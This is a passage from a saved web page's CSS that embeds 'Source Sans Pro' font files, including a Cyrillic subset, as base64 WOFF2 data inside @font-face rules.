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)
                    format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Source Sans Pro";
                font-style: normal;
                font-weight: 300;
                src: /*savepage-url=https://fonts.gstatic.com/s/sourcesanspro/v22/6xKydSBYKcSV-LCoeQqfX1RYOo3ik4zwkxduz8A.woff2*/ url(data:font/woff2;base64,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)
                    format("woff2");
